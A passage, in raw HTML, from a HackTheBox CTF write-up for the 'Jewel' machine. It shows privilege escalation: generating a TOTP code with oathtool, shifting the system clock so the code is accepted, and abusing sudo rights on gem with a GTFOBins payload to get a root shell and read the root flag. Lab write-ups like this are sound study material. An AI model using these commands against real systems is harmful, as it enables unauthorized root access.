type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So I tried to create the OTP code like that but it kept failing:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4 -S &#x27;2021-02-21 20:54:31+00:00&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">626503</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s try another method: setting teh same time on our machine. The box timezone:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ timedatectl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               Local time: Sun 2021-02-21 21:08:22 GMT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           Universal time: Sun 2021-02-21 21:08:22 UTC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                 RTC time: Sun 2021-02-21 21:08:21</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                Time zone: Europe/London (GMT, +0000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">System clock synchronized: no</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">              NTP service: active</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          RTC in local TZ: no</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Set up the time on my machine:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo timedatectl set-timezone Europe/London</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo timedatectl set-ntp false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo timedatectl set-time 21:15:07</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Finaly I can run it:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Defaults entries for bill on jewel:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    env_reset, mail_badpass,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    insults</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User bill may run the following commands on jewel:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (ALL : ALL) /usr/bin/gem</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>PS: it&#x27;s not an issue if there is a desync of a few seconds because the OTP
window is 17 codes so we can have a max desync of 17 x 30 sec.</p><p>Let&#x27;s see the pe for <code>gem</code>:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gtfoblookup linux sudo gem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gem:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sudo:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Description: This requires the name of an installed gem to be</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                     provided (`rdoc` is usually installed).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Code: sudo gem open -e &quot;/bin/sh -c /bin/sh&quot; rdoc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>My paylmaod will be</p><div class="language-palintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-palintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo /usr/bin/gem open -e &quot;/bin/sh -c /bin/bash&quot; bundler</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s get root:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=0(root) gid=0(root) groups=0(root)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># cat /root/root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">96a8f2a385ce2c384353e6998dc3fdac</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/ruby/">ruby</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/rails/">rails</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/gem/">gem</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/totp/">totp</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/otp/">otp</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/code/">code</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/cve/">cve</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/ForwardSlash/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">ForwardSlash </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Laboratory/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Laboratory </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#web-discovery" class="table-of-contents__link toc-highlight">Web discovery</a></li><li><a href="#source-code-analysis" class="table-of-contents__link toc-highlight">Source code analysis</a></li><li><a href="#web-exploitation" class="table-of-contents__link toc-highlight">Web exploitation</a></li><li><a href="#privilege-escalation-of-machine--from-bill-to-root" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from bill to root</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>